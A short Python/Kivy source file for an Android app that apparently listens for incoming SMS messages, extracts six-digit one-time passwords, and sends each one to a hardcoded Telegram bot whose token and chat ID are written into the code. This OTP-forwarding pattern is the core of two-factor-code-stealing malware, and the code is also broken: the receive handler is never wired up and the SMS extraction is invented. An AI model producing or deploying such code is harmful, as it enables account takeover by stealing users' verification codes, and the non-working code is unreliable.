from jnius import autoclass
from kivy.app import App
from kivy.uix.label import Label
import requests
import re

class OTPForwarderApp(App):
    def build(self):
        self.label = Label(text="Listening for OTP messages...")
        return self.label

    def on_start(self):
        # Create a BroadcastReceiver to listen for SMS
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        SmsReceiver = autoclass('android.content.BroadcastReceiver')
        context = PythonActivity.mActivity.getApplicationContext()

        def on_receive(context, intent):
            # Extract OTP and send to Telegram
            otp = self.extract_otp(intent)
            if otp:
                self.send_to_telegram(otp)
                self.label.text = f"OTP received: {otp}"

        # Register the receiver to listen for incoming SMS
        # You can set up proper SMS permissions here
        context.registerReceiver(SmsReceiver(), None)

    def extract_otp(self, intent):
        # Extract OTP using regex or message pattern
        message_body = intent.getStringExtra("message_body")
        match = re.search(r'\d{6}', message_body)
        if match:
            return match.group(0)
        return None

    def send_to_telegram(self, otp):
        token = "7823775078:AAFe_8dqKnr-KLqKIg1QC_Kt3E2EmrZQkD8"
        chat_id = "7927075609"
        url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={otp}"
        requests.get(url)

if __name__ == '__main__':
    OTPForwarderApp().run()
